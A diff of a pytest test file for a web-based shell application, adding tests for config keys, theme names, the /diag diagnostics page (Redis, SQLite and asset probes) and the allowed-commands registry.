@@ -9,14 +9,21 @@ import logging
 import os
 import re
 import sqlite3
+import tempfile
+import time
 import uuid
-from datetime import datetime, timedelta
+
+import pytest
+from datetime import datetime, timedelta, timezone
+from pathlib import Path
+from urllib.parse import quote
 import unittest.mock as mock
 
 import app as shell_app
 import blueprints.assets as shell_assets
 import config
 from database import DB_PATH
+from workspace import resolve_workspace_path
 
 
 # ── Fixtures ──────────────────────────────────────────────────────────────────
@@ -30,6 +37,27 @@ def get_client(*, use_forwarded_for=True):
     if use_forwarded_for:
         client.environ_base["HTTP_X_FORWARDED_FOR"] = f"203.0.113.{uuid.uuid4().int % 250 + 1}"
     return client
+
+
+class _RouteFakeProc:
+    def __init__(self, pid=4321):
+        self.pid = pid
+        self.stdout = mock.Mock()
+
+
+class _CapturedThread:
+    instances = []
+
+    def __init__(self, *, target=None, kwargs=None, name="", daemon=None):
+        self.target = target
+        self.kwargs = kwargs or {}
+        self.name = name
+        self.daemon = daemon
+        self.started = False
+        self.__class__.instances.append(self)
+
+    def start(self):
+        self.started = True
 
 
 # ── / ─────────────────────────────────────────────────────────────────────────
@@ -224,10 +252,25 @@ class TestConfigRoute:
     def test_contains_expected_keys(self):
         client = get_client()
         data = json.loads(client.get("/config").data)
-        for key in ("app_name", "project_readme", "prompt_prefix", "default_theme", "max_tabs", "max_output_lines"):
+        for key in (
+            "app_name", "project_readme", "prompt_username", "prompt_domain", "default_theme",
+            "max_tabs", "max_output_lines", "workspace_enabled",
+        ):
             assert key in data
         assert "share_redaction_enabled" in data
         assert "share_redaction_rules" in data
+
+    def test_workspace_menu_affordances_follow_config(self):
+        client = get_client()
+        with mock.patch.dict("config.CFG", {"workspace_enabled": False}):
+            disabled_body = client.get("/").get_data(as_text=True)
+        with mock.patch.dict("config.CFG", {"workspace_enabled": True}):
+            enabled_body = client.get("/").get_data(as_text=True)
+
+        assert 'data-action="workspace"' not in disabled_body
+        assert 'data-menu-action="workspace"' not in disabled_body
+        assert 'data-action="workspace"' in enabled_body
+        assert 'data-menu-action="workspace"' in enabled_body
 
     def test_max_tabs_is_int(self):
         client = get_client()
@@ -264,11 +307,12 @@ class TestConfigRoute:
             data = json.loads(client.get("/config").data)
         assert data["command_timeout_seconds"] == 300
 
-    def test_prompt_prefix_reflects_cfg(self):
+    def test_prompt_identity_reflects_cfg(self):
         client = get_client()
-        with mock.patch.dict("config.CFG", {"prompt_prefix": "ops@darklab:~$"}):
+        with mock.patch.dict("config.CFG", {"prompt_username": "ops", "prompt_domain": "darklab"}):
             data = json.loads(client.get("/config").data)
-        assert data["prompt_prefix"] == "ops@darklab:~$"
+        assert data["prompt_username"] == "ops"
+        assert data["prompt_domain"] == "darklab"
 
     def test_project_readme_is_constant(self):
         client = get_client()
@@ -384,23 +428,23 @@ class TestThemesRoute:
         client = get_client()
         data = json.loads(client.get("/themes").data)
         themes = {theme["name"]: theme for theme in data["themes"]}
-        assert "blue_paper" in themes
+        assert "apricot_sand" in themes
         assert "olive_grove" in themes
         assert "darklab_obsidian" in themes
         assert "emerald_obsidian" in themes
         assert "charcoal_steel" in themes
         assert "dark" not in themes
         assert "light" not in themes
-        assert themes["blue_paper"]["label"] == "Blue Paper"
+        assert themes["apricot_sand"]["label"] == "Apricot Sand"
         assert themes["olive_grove"]["label"] == "Olive Grove"
         assert themes["darklab_obsidian"]["label"] == "Darklab Obsidian"
         assert themes["emerald_obsidian"]["label"] == "Emerald Obsidian"
         assert themes["charcoal_steel"]["label"] == "Charcoal Steel"
-        assert themes["blue_paper"]["group"] == "Cool Light"
+        assert themes["apricot_sand"]["group"] == "Warm Light"
         assert themes["olive_grove"]["group"] == "Warm Light"
         assert themes["darklab_obsidian"]["group"] == "Dark Neon"
         assert themes["emerald_obsidian"]["group"] == "Dark Neon"
-        assert themes["blue_paper"]["filename"] == "blue_paper.yaml"
+        assert themes["apricot_sand"]["filename"] == "apricot_sand.yaml"
         assert themes["olive_grove"]["filename"] == "olive_grove.yaml"
         assert themes["darklab_obsidian"]["filename"] == "darklab_obsidian.yaml"
         assert themes["emerald_obsidian"]["filename"] == "emerald_obsidian.yaml"
@@ -422,11 +466,11 @@ class TestThemesRoute:
 
     def test_pref_theme_name_cookie_selects_variant(self):
         client = get_client(use_forwarded_for=False)
-        client.set_cookie("pref_theme_name", "blue_paper")
+        client.set_cookie("pref_theme_name", "apricot_sand")
         data = json.loads(client.get("/themes").data)
-        assert data["current"]["name"] == "blue_paper"
-        assert data["current"]["label"] == "Blue Paper"
-        assert data["current"]["group"] == "Cool Light"
+        assert data["current"]["name"] == "apricot_sand"
+        assert data["current"]["label"] == "Apricot Sand"
+        assert data["current"]["group"] == "Warm Light"
 
     def test_empty_registry_falls_back_to_built_in_dark_theme(self, monkeypatch):
         client = get_client(use_forwarded_for=False)
@@ -547,6 +591,35 @@ class TestDiagRoute:
                     "share_redaction_enabled", "custom_redaction_rule_count"):
             assert key in cfg, f"missing config key: {key}"
 
+    def test_every_config_key_belongs_to_a_group(self):
+        """Drift guard: every key emitted into result['config'] must be
+        listed in exactly one `_DIAG_CONFIG_GROUPS` entry, otherwise it
+        renders nowhere on the page."""
+        grouped: set[str] = set()
+        seen_twice: set[str] = set()
+        for _label, keys in shell_assets._DIAG_CONFIG_GROUPS:
+            for key in keys:
+                if key in grouped:
+                    seen_twice.add(key)
+                grouped.add(key)
+        assert not seen_twice, f"config keys appear in multiple groups: {seen_twice}"
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            data = json.loads(client.get("/diag?format=json").data)
+        emitted = set(data["config"].keys())
+        missing_from_groups = emitted - grouped
+        assert not missing_from_groups, (
+            f"config keys not in any group (would be invisible on /diag): {missing_from_groups}"
+        )
+
+    def test_html_response_renders_config_group_labels(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            body = client.get("/diag").get_data(as_text=True)
+        for label, _keys in shell_assets._DIAG_CONFIG_GROUPS:
+            assert label in body, f"config group label '{label}' not rendered"
+        assert "diag-config-group-label" in body
+
     def test_db_section_ok_and_has_counts(self):
         client = self._allowed_client()
         with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
@@ -569,13 +642,349 @@ class TestDiagRoute:
             data = json.loads(client.get("/diag?format=json").data)
         assert "configured" in data["redis"]
 
+    def _fake_redis_client(self, *, ping_exc=None, scan_keys=None, info_data=None,
+                           sismember_map=None, get_map=None, dbsize=None,
+                           xlen_map=None):
+        """Build a MagicMock that mimics the redis-py methods _diag_redis_stats uses."""
+        scan_keys = scan_keys or {}
+        info_data = info_data or {}
+        sismember_map = sismember_map or {}
+        get_map = get_map or {}
+        xlen_map = xlen_map or {}
+
+        fake = mock.MagicMock()
+        if ping_exc is None:
+            fake.ping.return_value = True
+        else:
+            fake.ping.side_effect = ping_exc
+        fake.dbsize.return_value = dbsize if dbsize is not None else sum(
+            len(keys) for keys in scan_keys.values()
+        )
+
+        def scan(cursor=0, match=None, count=None):  # noqa: ARG001
+            keys = scan_keys.get(match, [])
+            return (0, list(keys))
+        fake.scan.side_effect = scan
+        fake.xlen.side_effect = lambda key: xlen_map.get(key, 0)
+        fake.get.side_effect = lambda key: get_map.get(key)
+        fake.sismember.side_effect = lambda key, member: bool(
+            member in sismember_map.get(key, set())
+        )
+        fake.info.side_effect = lambda section: info_data.get(section, {})
+        return fake
+
+    def test_redis_stats_present_when_client_reachable(self):
+        client = self._allowed_client()
+        run_id = "r1"
+        meta_payload = json.dumps({"session_id": "s1", "run_id": run_id})
+        fake = self._fake_redis_client(
+            scan_keys={
+                "runstream:*":     [f"runstream:{run_id}"],
+                "proc:*":          [f"proc:{run_id}"],
+                "procmeta:*":      [f"procmeta:{run_id}"],
+                "sessionprocs:*":  ["sessionprocs:s1"],
+            },
+            xlen_map={f"runstream:{run_id}": 17},
+            get_map={f"procmeta:{run_id}": meta_payload},
+            sismember_map={"sessionprocs:s1": {run_id}},
+            info_data={
+                "memory":      {"used_memory_human": "1.2M", "used_memory_peak_human": "2.0M",
+                                "maxmemory_human": "0", "mem_fragmentation_ratio": 1.05},
+                "persistence": {"aof_enabled": 1, "rdb_last_save_time": int(time.time()) - 90,
+                                "rdb_changes_since_last_save": 4},
+                "stats":       {"evicted_keys": 0, "expired_keys": 12},
+                "clients":     {"connected_clients": 3, "rejected_connections": 0},
+            },
+        )
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            with mock.patch.object(shell_assets, "redis_client", fake):
+                data = json.loads(client.get("/diag?format=json").data)
+        stats = data["redis"]["stats"]
+        assert data["redis"]["ok"] is True
+        assert isinstance(stats["ping_ms"], (int, float))
+        assert stats["dbsize"] == 4
+        names = {ns["name"]: ns for ns in stats["namespaces"]}
+        assert names["runstream"]["count"] == 1
+        assert names["procmeta"]["count"] == 1
+        assert "capped" not in names["runstream"]
+        assert stats["stream_length"]["max"] == 17
+        assert stats["orphans"] == {"probed": 1, "orphaned": 0}
+        assert stats["memory"]["used"] == "1.2M"
+        assert stats["persistence"]["aof_enabled"] is True
+        assert stats["persistence"]["rdb_last_save_human"].endswith(" ago")
+        assert stats["evicted_keys"] == 0
+        assert stats["clients"]["connected"] == 3
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            with mock.patch.object(shell_assets, "redis_client", fake):
+                body = client.get("/diag").get_data(as_text=True)
+        assert "RDB saved" in body
+        assert "changes since save" in body
+        assert "AOF on" not in body
+        assert "AOF off" not in body
+
+    def test_redis_stats_absent_when_ping_fails(self):
+        client = self._allowed_client()
+        fake = self._fake_redis_client(ping_exc=ConnectionError("redis unreachable"))
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            with mock.patch.object(shell_assets, "redis_client", fake):
+                data = json.loads(client.get("/diag?format=json").data)
+        assert data["redis"]["ok"] is False
+        assert "redis unreachable" in data["redis"]["error"]
+        assert "stats" not in data["redis"]
+
+    def test_redis_orphan_count_flags_dangling_procmeta(self):
+        client = self._allowed_client()
+        # procmeta:r2 references session s2, but sessionprocs:s2 has no member r2 → orphan.
+        fake = self._fake_redis_client(
+            scan_keys={
+                "runstream:*":    [],
+                "proc:*":         [],
+                "procmeta:*":     ["procmeta:r2"],
+                "sessionprocs:*": ["sessionprocs:s2"],
+            },
+            get_map={"procmeta:r2": json.dumps({"session_id": "s2", "run_id": "r2"})},
+            sismember_map={"sessionprocs:s2": set()},
+        )
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            with mock.patch.object(shell_assets, "redis_client", fake):
+                data = json.loads(client.get("/diag?format=json").data)
+        assert data["redis"]["stats"]["orphans"] == {"probed": 1, "orphaned": 1}
+
+    def test_redis_namespace_count_marks_capped_when_scan_hits_limit(self):
+        client = self._allowed_client()
+        cap = shell_assets._DIAG_REDIS_SCAN_KEY_CAP
+        # Return cap+1 fake runstream keys so the bounded scan trips the capped flag.
+        many_streams = [f"runstream:r{i}" for i in range(cap + 5)]
+        fake = self._fake_redis_client(
+            scan_keys={
+                "runstream:*":    many_streams,
+                "proc:*":         [],
+                "procmeta:*":     [],
+                "sessionprocs:*": [],
+            },
+        )
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            with mock.patch.object(shell_assets, "redis_client", fake):
+                data = json.loads(client.get("/diag?format=json").data)
+        runstream_ns = next(ns for ns in data["redis"]["stats"]["namespaces"]
+                            if ns["name"] == "runstream")
+        assert runstream_ns["capped"] is True
+        assert runstream_ns["count"] == cap
+
+    def test_broker_section_reports_in_process_mode_when_redis_unconfigured(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            with mock.patch.object(shell_assets, "redis_client", None):
+                data = json.loads(client.get("/diag?format=json").data)
+        broker = data["broker"]
+        assert broker["mode"] == "in_process"
+        assert "fallback" in broker
+        for key in ("streams", "active", "closed", "expired_pending_purge",
+                    "events", "bytes", "pid_count", "active_run_count",
+                    "session_count"):
+            assert key in broker["fallback"], f"missing fallback key: {key}"
+
+    def test_broker_section_omits_fallback_when_redis_configured(self):
+        client = self._allowed_client()
+        fake = self._fake_redis_client()
+        # `broker_mode()` reads from run_broker's own module-level reference,
+        # so patch both the assets-blueprint binding and the broker module.
+        import run_broker as shell_broker
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            with mock.patch.object(shell_assets, "redis_client", fake):
+                with mock.patch.object(shell_broker, "redis_client", fake):
+                    data = json.loads(client.get("/diag?format=json").data)
+        broker = data["broker"]
+        assert broker["mode"] == "redis"
+        assert "fallback" not in broker
+
+    def test_broker_section_reports_unavailable_when_disabled(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {
+            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
+            "run_broker_enabled": False,
+        }):
+            data = json.loads(client.get("/diag?format=json").data)
+        broker = data["broker"]
+        assert broker["available"] is False
+        assert "disabled" in broker["unavailable_reason"].lower()
+
+    def test_broker_fallback_snapshot_reflects_published_events(self):
+        client = self._allowed_client()
+        # Publish two events to the in-memory store so the snapshot is non-empty.
+        # Use a dedicated module import to avoid leaking state across tests.
+        import run_broker as shell_broker
+        run_id = f"diag-test-{uuid.uuid4().hex}"
+        try:
+            shell_broker._memory_store.publish(run_id, "stdout", {"line": "hi"})
+            shell_broker._memory_store.publish(run_id, "stdout", {"line": "again"})
+            with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+                with mock.patch.object(shell_assets, "redis_client", None):
+                    data = json.loads(client.get("/diag?format=json").data)
+            fb = data["broker"]["fallback"]
+            assert fb["streams"] >= 1
+            assert fb["events"] >= 2
+            assert fb["active"] >= 1
+            assert fb["bytes"] > 0
+        finally:
+            # Trip the snapshot's purge: drop the test run from the in-memory
+            # store so we don't leak state into later tests.
+            with shell_broker._memory_store._lock:
+                shell_broker._memory_store._events.pop(run_id, None)
+                shell_broker._memory_store._bytes.pop(run_id, None)
+                shell_broker._memory_store._closed.discard(run_id)
+                shell_broker._memory_store._expires_at.pop(run_id, None)
+
+    def test_db_section_reports_file_size_and_human(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            data = json.loads(client.get("/diag?format=json").data)
+        db = data["db"]
+        assert isinstance(db["size"], int) and db["size"] > 0
+        assert db["size_human"]
+        assert any(db["size_human"].endswith(unit) for unit in (" B", " KB", " MB", " GB"))
+        # WAL size key is always populated (zero if no -wal sidecar exists)
+        assert isinstance(db["wal_size"], int)
+        assert db["wal_size_human"]
+
+    def test_db_section_reports_journal_mode(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            data = json.loads(client.get("/diag?format=json").data)
+        # SQLite returns one of: delete, truncate, persist, memory, wal, off.
+        assert data["db"]["journal_mode"] in {
+            "delete", "truncate", "persist", "memory", "wal", "off",
+        }
+
+    def test_db_section_reports_freelist_and_reclaimable_bytes(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            data = json.loads(client.get("/diag?format=json").data)
+        db = data["db"]
+        assert isinstance(db["page_count"], int) and db["page_count"] > 0
+        assert isinstance(db["page_size"], int) and db["page_size"] > 0
+        assert isinstance(db["freelist_count"], int) and db["freelist_count"] >= 0
+        assert db["reclaimable_size"] == db["freelist_count"] * db["page_size"]
+        assert db["reclaimable_size_human"]
+
+    def test_db_section_reports_per_table_row_counts(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            data = json.loads(client.get("/diag?format=json").data)
+        tables = data["db"]["tables"]
+        assert isinstance(tables, list) and tables
+        names = {t["name"] for t in tables}
+        # Core schema tables are present and FTS5 shadow tables are not.
+        assert "runs" in names
+        assert not any(name.startswith("sqlite_") for name in names)
+        assert not any(name.startswith("runs_fts_") for name in names), (
+            f"FTS5 shadow tables leaked into the table list: {names}"
+        )
+        for entry in tables:
+            assert isinstance(entry["name"], str) and entry["name"]
+            assert isinstance(entry["rows"], int) and entry["rows"] >= 0
+
+    def test_db_section_quotes_metadata_table_names_for_row_counts(self, tmp_path):
+        db_path = tmp_path / "diag_tables.db"
+        with sqlite3.connect(db_path) as conn:
+            conn.execute('CREATE TABLE "odd""table" (id INTEGER PRIMARY KEY)')
+            conn.execute('INSERT INTO "odd""table" DEFAULT VALUES')
+            conn.execute('INSERT INTO "odd""table" DEFAULT VALUES')
+            conn.commit()
+
+        def connect_tmp_db():
+            return sqlite3.connect(db_path)
+
+        with mock.patch.object(shell_assets, "DB_PATH", str(db_path)), \
+             mock.patch.object(shell_assets, "db_connect", connect_tmp_db):
+            info = shell_assets._diag_db_stats()
+
+        assert {"name": 'odd"table', "rows": 2} in info["tables"]
+
+    def test_diag_sqlite_identifier_rejects_empty_or_nul_names(self):
+        assert shell_assets._diag_sqlite_identifier('odd"table') == '"odd""table"'
+        with pytest.raises(ValueError):
+            shell_assets._diag_sqlite_identifier("")
+        with pytest.raises(ValueError):
+            shell_assets._diag_sqlite_identifier("bad\x00name")
+
+    def test_db_section_runs_and_snapshots_remain_at_top_level(self):
+        """Backward-compat for the original /diag schema — `runs` and
+        `snapshots` are still surfaced at db.* even though they are also
+        listed inside `tables`."""
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            data = json.loads(client.get("/diag?format=json").data)
+        assert isinstance(data["db"]["runs"], int)
+        assert isinstance(data["db"]["snapshots"], int)
+        # Match the per-table row count.
+        runs_in_table = next(
+            (t["rows"] for t in data["db"]["tables"] if t["name"] == "runs"), None
+        )
+        assert data["db"]["runs"] == runs_in_table
+
+    def test_db_section_reports_fts_orphan_count(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            data = json.loads(client.get("/diag?format=json").data)
+        assert isinstance(data["db"]["fts_orphans"], int)
+        assert data["db"]["fts_orphans"] >= 0
+
+    def test_db_fts_orphan_probe_uses_sqlite_rowid_not_uuid_id(self, tmp_path):
+        db_path = tmp_path / "diag_fts.db"
+        with sqlite3.connect(db_path) as conn:
+            conn.execute(
+                "CREATE TABLE runs ("
+                "id TEXT PRIMARY KEY, command TEXT NOT NULL, "
+                "output_search_text TEXT)"
+            )
+            conn.execute(
+                "CREATE VIRTUAL TABLE runs_fts USING fts5("
+                "command, output_search_text, content=runs, content_rowid=rowid)"
+            )
+            conn.execute(
+                "INSERT INTO runs (id, command, output_search_text) VALUES (?, ?, ?)",
+                ("run-uuid-1", "ping darklab.sh", "ok"),
+            )
+            rowid = conn.execute(
+                "SELECT rowid FROM runs WHERE id = ?",
+                ("run-uuid-1",),
+            ).fetchone()[0]
+            conn.execute(
+                "INSERT INTO runs_fts(rowid, command, output_search_text) "
+                "VALUES (?, ?, ?)",
+                (rowid, "ping darklab.sh", "ok"),
+            )
+            conn.commit()
+
+        def connect_tmp_db():
+            return sqlite3.connect(db_path)
+
+        with mock.patch.object(shell_assets, "DB_PATH", str(db_path)), \
+             mock.patch.object(shell_assets, "db_connect", connect_tmp_db):
+            info = shell_assets._diag_db_stats()
+
+        assert info["runs"] == 1
+        assert info["fts_orphans"] == 0
+
+    def test_db_section_reports_query_latency(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            data = json.loads(client.get("/diag?format=json").data)
+        assert data["db"]["ok"] is True
+        assert isinstance(data["db"]["query_ms"], (int, float))
+        assert data["db"]["query_ms"] >= 0
+
     def test_assets_section_reports_loaded_when_files_present(self):
         client = self._allowed_client()
         with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
             data = json.loads(client.get("/diag?format=json").data)
-        assert data["assets"]["ansi_up"] == "loaded"
-        assert data["assets"]["jspdf"] == "loaded"
-        assert data["assets"]["fonts"] == "loaded"
+        for label in ("ansi_up", "jspdf", "fonts"):
+            entry = data["assets"][label]
+            assert entry["ok"] is True, f"{label} probe should be ok: {entry!r}"
+            assert entry["status"] == 200
+            assert entry["size"] > 0, f"{label} HEAD reported zero bytes"
+            assert entry["size_human"]
 
     def test_assets_section_reports_missing_when_files_absent(self, tmp_path, monkeypatch):
         client = self._allowed_client()
@@ -584,9 +993,46 @@ class TestDiagRoute:
         monkeypatch.setattr(shell_assets, "_FONT_DIR", tmp_path / "missing_fonts")
         with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
             data = json.loads(client.get("/diag?format=json").data)
-        assert data["assets"]["ansi_up"] == "missing"
-        assert data["assets"]["jspdf"] == "missing"
-        assert data["assets"]["fonts"] == "missing"
+        for label in ("ansi_up", "jspdf", "fonts"):
+            entry = data["assets"][label]
+            assert entry["ok"] is False, f"{label} probe should fail: {entry!r}"
+            assert entry["status"] == 404
+
+    def test_assets_probe_size_matches_served_content_length(self):
+        """The HEAD probe surfaces the actual served Content-Length, so
+        a zero-byte or partial file is visible without shelling in."""
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            data = json.loads(client.get("/diag?format=json").data)
+        # The size reported by the probe matches a direct GET against the URL.
+        for label in ("ansi_up", "jspdf"):
+            entry = data["assets"][label]
+            direct = client.get(entry["url"])
+            assert direct.status_code == 200
+            served_size = int(direct.headers.get("Content-Length") or len(direct.data))
+            assert entry["size"] == served_size, (
+                f"{label} probe size {entry['size']} != served size {served_size}"
+            )
+
+    def test_assets_probe_reports_size_human_in_short_form(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            data = json.loads(client.get("/diag?format=json").data)
+        for label in ("ansi_up", "jspdf", "fonts"):
+            human = data["assets"][label]["size_human"]
+            assert human, f"{label} probe missing size_human"
+            assert any(human.endswith(unit) for unit in (" B", " KB", " MB", " GB")), (
+                f"unexpected size_human format: {human!r}"
+            )
+
+    def test_diag_fmt_bytes_buckets(self):
+        f = shell_assets._diag_fmt_bytes
+        assert f(0) == "0 B"
+        assert f(512) == "512 B"
+        assert f(1024) == "1.0 KB"
+        assert f(1536) == "1.5 KB"
+        assert f(1024 * 1024) == "1.0 MB"
+        assert f(1024 * 1024 * 1024) == "1.0 GB"
 
     def test_tools_section_has_present_and_missing_lists(self):
         client = self._allowed_client()
@@ -603,10 +1049,54 @@ class TestDiagRoute:
         # At minimum, basic tools available in dev should appear in present
         present = data["tools"]["present"]
         assert isinstance(present, list)
-        # Every entry in present must actually resolve via which()
+        # Every entry in present is a dict with a name that resolves via which()
         import shutil as _shutil
-        for tool in present:
-            assert _shutil.which(tool) is not None, f"{tool} in present but not found by which()"
+        for entry in present:
+            assert isinstance(entry, dict), f"present entry is not a dict: {entry!r}"
+            assert _shutil.which(entry["name"]) is not None, (
+                f"{entry['name']} in present but not found by which()"
+            )
+
+    def test_tools_present_entries_carry_name_and_path_only(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            data = json.loads(client.get("/diag?format=json").data)
+        present = data["tools"]["present"]
+        if not present:
+            pytest.skip("dev environment has no allowlisted binaries on PATH")
+        for entry in present:
+            assert set(entry.keys()) == {"name", "path"}
+            assert isinstance(entry["name"], str) and entry["name"]
+            assert isinstance(entry["path"], str) and entry["path"].startswith("/")
+
+    def test_tools_probe_does_not_read_binary_mtime(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            with mock.patch("blueprints.assets.shutil.which", return_value="/fake/bin/tool"):
+                with mock.patch(
+                    "blueprints.assets.os.path.getmtime",
+                    side_effect=AssertionError("tool mtime should not be probed"),
+                ):
+                    data = json.loads(client.get("/diag?format=json").data)
+        present = data["tools"]["present"]
+        assert present, "expected synthetic which() to populate the present list"
+        assert all(set(entry.keys()) == {"name", "path"} for entry in present)
+
+    def test_tools_html_omits_stale_counts_and_age_suffixes(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            with mock.patch("blueprints.assets.shutil.which", return_value="/fake/bin/tool"):
+                body = client.get("/diag").get_data(as_text=True)
+        assert "diag-chip-age" not in body
+        assert " stale)" not in body
+        assert 'class="diag-chip present stale"' not in body
+
+    def test_diag_tool_entry_returns_name_and_path_only(self):
+        with mock.patch("blueprints.assets.shutil.which", return_value="/fake/bin/tool"):
+            assert shell_assets._diag_tool_entry("curl") == {
+                "name": "curl",
+                "path": "/fake/bin/tool",
+            }
 
     def test_honors_forwarded_for_header_from_trusted_proxy(self):
         client = self._allowed_client()
@@ -652,6 +1142,65 @@ class TestDiagRoute:
         assert "back to shell" in body
         assert "<!DOCTYPE html>" in body or "<html" in body.lower()
 
+    def test_top_command_cells_are_keyboard_expandable(self):
+        """Top Commands cells render as accessible toggle buttons (tabindex=0,
+        role=button, aria-expanded=false) with a delegated tap handler so
+        an operator on mobile can read the full command without `title=`
+        hover affordances."""
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            body = client.get("/diag").get_data(as_text=True)
+        if "diag-cmd-cell" not in body:
+            pytest.skip("no top-command rows in the dev DB to assert against")
+        assert (
+            'class="diag-cmd-cell" tabindex="0" role="button" aria-expanded="false"'
+            in body
+        ), "top-command cells must carry the expand-button accessibility attrs"
+        assert "toggleCmdCell" in body, "tap-to-expand handler missing from page script"
+
+    def test_top_command_cells_render_full_untruncated_command(self):
+        """The 48-char server-side `truncate` is gone — full text reaches
+        the DOM so the JS expand handler can show it."""
+        long_command = (
+            "nmap -sT -p 1-65535 -T4 --max-retries 5 --host-timeout 30m "
+            "-oA /workspace/scan-output ip.darklab.sh"
+        )
+        assert len(long_command) > 48, "fixture must exceed the old truncate length"
+        from database import db_connect
+        run_id = f"diag-long-cmd-{uuid.uuid4().hex}"
+        started = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
+        try:
+            with db_connect() as conn:
+                conn.execute(
+                    "INSERT INTO runs (id, session_id, command, started, exit_code) "
+                    "VALUES (?, ?, ?, ?, ?)",
+                    (run_id, "diag-test", long_command, started, 0),
+                )
+                conn.commit()
+            client = self._allowed_client()
+            with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+                body = client.get("/diag").get_data(as_text=True)
+            # Full command appears at least twice: in `title=` and as cell text.
+            # If the old truncate were still in play we would only see it in title.
+            assert body.count(long_command) >= 2, (
+                "full command should appear in both title and cell text"
+            )
+            assert "…" not in body or long_command in body
+        finally:
+            with db_connect() as conn:
+                conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
+                conn.commit()
+
+    def test_html_response_carries_live_indicator_and_no_refresh_toggle(self):
+        client = self._allowed_client()
+        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
+            body = client.get("/diag").get_data(as_text=True)
+        assert "diag-live-indicator" in body
+        assert "Refreshed at" in body
+        assert "Generated at" not in body
+        assert "diag-refresh-checkbox" not in body
+        assert "Auto-refresh" not in body
+
     def test_html_response_renders_zero_custom_redaction_rule_count_as_numeric_zero(self):
         client = self._allowed_client()
         with mock.patch.dict("config.CFG", {
@@ -687,27 +1236,93 @@ class TestAllowedCommandsRoute:
 
     def test_unrestricted_when_no_file(self):
         client = get_client()
-        # Patch in app's namespace — the route calls load_allowed_commands() directly
-        with mock.patch("blueprints.content.load_allowed_commands", return_value=(None, [])):
+        with mock.patch("blueprints.content.load_commands_registry", return_value={"commands": [], "pipe_helpers": []}):
             data = json.loads(client.get("/allowed-commands").data)
         assert data["restricted"] is False
 
     def test_restricted_when_file_present(self):
         client = get_client()
-        with mock.patch("blueprints.content.load_allowed_commands", return_value=(["ping", "nmap"], [])):
-            with mock.patch("blueprints.content.load_allowed_commands_grouped", return_value=[]):
-                data = json.loads(client.get("/allowed-commands").data)
+        with mock.patch("blueprints.content.load_commands_registry", return_value={
+            "commands": [
+                {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
+                {"root": "nmap", "category": "Scanning", "policy": {"allow": ["nmap"], "deny": []}},
+            ],
+            "pipe_helpers": [],
+        }):
+            data = json.loads(client.get("/allowed-commands").data)
         assert data["restricted"] is True
         assert "ping" in data["commands"]
 
     def test_returns_grouped_commands_when_restricted(self):
         client = get_client()
         groups = [{"name": "Networking", "commands": ["ping", "traceroute"]}]
-        with mock.patch("blueprints.content.load_allowed_commands", return_value=(["ping", "traceroute"], [])):
-            with mock.patch("blueprints.content.load_allowed_commands_grouped", return_value=groups):
-                data = json.loads(client.get("/allowed-commands").data)
+        with mock.patch("blueprints.content.load_commands_registry", return_value={
+            "commands": [
+                {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
+                {
+                    "root": "traceroute",
+                    "category": "Networking",
+                    "policy": {"allow": ["traceroute"], "deny": []},
+                },
+            ],
+            "pipe_helpers": [],
+        }):
